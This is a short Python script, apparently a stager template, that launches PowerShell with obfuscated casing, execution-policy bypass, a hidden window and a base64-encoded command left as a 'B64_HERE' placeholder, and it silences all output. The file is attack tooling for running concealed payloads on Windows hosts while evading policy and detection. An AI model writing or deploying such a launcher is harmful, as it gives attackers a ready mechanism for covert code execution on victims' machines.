import subprocess

def main():
	b64 = "B64_HERE"
	cmd = ['pOwERsHeLl','-nop','-ep','bypass','-noexit','-NonI','-w','hidden','-e',b64]
	subprocess.run(cmd,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

if __name__ == "__main__":
	main()
